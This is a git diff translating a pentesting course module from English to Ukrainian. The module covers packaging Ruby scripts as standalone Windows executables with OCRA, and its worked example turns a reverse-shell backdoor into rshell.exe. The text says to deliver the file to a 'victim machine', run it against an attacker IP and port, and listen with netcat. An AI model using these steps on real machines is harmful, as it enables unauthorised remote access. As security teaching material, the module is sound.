@@ -1,29 +1,27 @@
-# Module 0x2 | System Kung Fu
+# модуль 0x2 | Системне Кнуг-Фу
 
-## Packaging
+## Пакування
 
-Many questions about building a standalone application that doesn't require Ruby to be pre-installed on the system. Of-course, due attacking machine you cant grantee that ruby is installed on the target system. So here we will demonstrate some ways to do that.
+Може виникнути питання про написання самостійних програм, яким для роботи не потрібно мати встановленого в системі Рубі. І дійсно, атакуючи якийсь комп'ютер, ми не можемо гарантувати що на ній буде встановлено Рубі і це проблема. В цьому розділі ми покажемо деякі шляхи як вирішити цю проблему.
 
+### Збирач Рубі Застосункав в один клік(OCRA Builder)
+OCRA (One-Click Ruby Application) збирає програму під Windows використовуючи вихідний код на Рубі. Результатом роботи збирача буде готова програма, яка міститиме в собі інтерпретатор Рубі, ваш вихідний код, а також необхідні dll бібліотеки.
 
-### One-Click Ruby Application(OCRA) Builder
-OCRA (One-Click Ruby Application) builds Windows executables from Ruby source code. The executable is a self-extracting, self-running executable that contains the Ruby interpreter, your source code and any additionally needed ruby libraries or DLL.
+**Це працює тілки в Windows**, насправді ні ;)
 
-**It's Windows support only**, not really ;)
+- Можливості
+> - LZMA Компресія (ввімкнено за замовченням)
+> - Підтримка Ruby 1.8.7, 1.9.3, 2.0.0 а також 2.1.5 
+> - Підтримку/ як віконний так і консольний режими
+> - Включає потрібні для роботи геми, або геми вказані в Gemfile
 
-- Features
-> - LZMA Compression (optional, default on)
-> - Ruby 1.8.7, 1.9.3, 2.0.0 and 2.1.5 support
-> - Both windowed/console mode supported
-> - Includes gems based on usage, or from a Bundler Gemfile
-
-- To install OCRA
+- Установка OCRA
 ```
 gem install ocra
 ```
+Отже все що залишилося, так це мати програму, що ми збиратимемо.
+Припустимо, в нас ж наступний скрипт, бекдор звісно ж ;)
 
-So all what to need is to have your application.
-
-Suppose we have the following script, a reverse shell of course ;)
 ```ruby
 #!/usr/bin/env ruby
 # KING SABRI | @KINGSABRI
@@ -39,12 +37,12 @@ while cmd = s.gets
 end
 ```
 
-from our Windows Attacker machine cmd.exe
+І тепер на вашому комп'ютері з ОС Windows виконайте наступну команду в cmd.exe
 ```
 C:\Users\admin\Desktop>ocra rshell.rb --windows --console
 ```
 
-Results 
+Результат: 
 
 ```
 C:\Users\admin\Desktop>ocra rshell.rb --windows --console
@@ -77,13 +75,12 @@ ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]
 === Finished building rshell.exe (2756229 bytes)
 ```
 
-In the same directory, you'll find an exe file `rshell.exe`. Send it on the windows victim machine which doesn't have ruby installed and run it.
+В тій самій теці, звідки ви запустили команди має з'явитися новий `rshell.exe` файл. Відправте його на атаковану машину, яка не має встановленого Рубі та запустіть.
 
 ```
 rshell.exe 192.168.0.14 9911 
 ```
-
-from our attacking machine we already listening on 9911
+якщо все ок, то з нашої атакованої машини матимемо відкритий порт 9911 на якому буде працювати наш бекдор.
 ```
 nc -lvp 9911
 ```
@@ -91,7 +88,8 @@ nc -lvp 9911
 
 
 
-### Traveling-ruby
+### Мандруючий Рубі(Traveling-ruby)
+
 From official site[^1] "*Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support (with some caveats). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems.*"
 
 
